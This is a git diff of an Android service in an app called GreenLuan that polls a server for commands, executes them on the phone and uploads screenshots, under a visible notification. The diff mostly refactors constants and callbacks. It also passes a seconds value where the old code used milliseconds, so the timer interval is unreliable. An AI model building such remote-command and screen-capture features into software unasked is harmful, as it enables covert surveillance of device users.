@@ -22,17 +22,15 @@ import androidx.core.app.NotificationCompat;
 
 import com.google.gson.Gson;
 
-import cn.stkit.greenluan.App;
 import cn.stkit.greenluan.MainActivity;
 import cn.stkit.greenluan.R;
-import cn.stkit.greenluan.activity.OverlayMessageActivity;
+import cn.stkit.greenluan.config.ConfigConstants;
 import cn.stkit.greenluan.network.ApiClient;
 import cn.stkit.greenluan.util.HttpUtils;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.IOException;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.concurrent.Executors;
@@ -40,22 +38,21 @@ import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 import cn.stkit.greenluan.util.ScreenshotUtils;
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.Response;
 
 /**
  * 命令执行服务
+ * 接受服务器下达的命令，并且在手机上执行
  * @author Zeeny  zhwenyou@gmail.com
  * @date 2025-6-4
  */
 public class CommandProcessingService extends Service {
 
     private static final String TAG = "GreenLuanCommandService";
-    private static final int NOTIFICATION_ID = 103;
-    private static final String NOTIFICATION_CHANNEL_ID = "greenLuan's_command_service_channel";
+    //通知相关
+    private static final int NOTIFICATION_ID = ConfigConstants.COMMAND_NOTIFICATION_ID;//通知ID
+    private static final String NOTIFICATION_CHANNEL_ID = ConfigConstants.COMMAND_NOTIFICATION_CHANNEL_ID;//命令处理通知通道,渠道ID,greenLuan's_command_service_channel
     // 检查命令间隔（秒）
-    private static final long COMMAND_CHECK_INTERVAL = 30;
+    private static final long COMMAND_CHECK_INTERVAL = ConfigConstants.COMMAND_CHECK_INTERVAL;
 
     private WindowManager windowManager;
     private View overlayView;
@@ -63,7 +60,6 @@ public class CommandProcessingService extends Service {
     private Gson gson;
 
     //old code
-    private static final long CHECK_INTERVAL = 30 * 1000; // 30秒检查一次
     private Timer commandCheckTimer;
     // end old code
 
@@ -150,7 +146,7 @@ public class CommandProcessingService extends Service {
     private void checkForCommands() {
         Log.d(TAG, "Checking for new commands from GreenLuan's server");
 
-        ApiClient.getInstance(this).fetchCommands(new ApiClient.Callback() {
+        ApiClient.getInstance(this).fetchCommands(new ApiClient.ApiCallback() {
             @Override
             public void onSuccess(String response) {
                 Log.d(TAG, "Received commands: " + response);
@@ -272,7 +268,7 @@ public class CommandProcessingService extends Service {
 
     //上传截图到服务器
     private void uploadScreenshot(Bitmap bitmap) {
-        ApiClient.getInstance(this).uploadScreenshot(bitmap, new ApiClient.Callback() {
+        ApiClient.getInstance(this).uploadScreenshot(bitmap, new ApiClient.ApiCallback() {
             @Override
             public void onSuccess(String response) {
                 Log.d(TAG, "GreenLuan's Screenshot uploaded successfully");
@@ -297,26 +293,27 @@ public class CommandProcessingService extends Service {
                 notificationIntent, PendingIntent.FLAG_IMMUTABLE);
 
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-                .setContentTitle("GreenLuan's Screenshot Command receiving service")//命令接收服务
+                .setContentTitle("GreenLuan's Command receiving service")//命令接收服务
                 .setContentText("Waiting for the GreenLuanServer's instructions")//正在等待服务器指令
-                .setSmallIcon(R.drawable.ic_screenshot)//ic_notification
+                .setSmallIcon(R.drawable.ic_command)//ic_notification
                 .setContentIntent(pendingIntent)
                 .setPriority(NotificationCompat.PRIORITY_LOW);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            //命令处理通知通道
             NotificationChannel channel = new NotificationChannel(
                     NOTIFICATION_CHANNEL_ID,
-                    "GreenLuan's Screenshot Command receiving service",//命令接收服务
-                    NotificationManager.IMPORTANCE_LOW
+                    "GreenLuan's Command receiving service",//命令接收服务
+                    NotificationManager.IMPORTANCE_LOW //NotificationManager.IMPORTANCE_DEFAULT
             );
+            channel.setDescription("GreenLuan's Service for processing server commands");
+
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
         }
 
         return builder.build();
     }
-
-
 
     //old code
     private void startCommandCheckTimer() {
@@ -326,7 +323,7 @@ public class CommandProcessingService extends Service {
             public void run() {
                 checkForCommands();
             }
-        }, 0, CHECK_INTERVAL);
+        }, 0, COMMAND_CHECK_INTERVAL);
     }
 
     /*
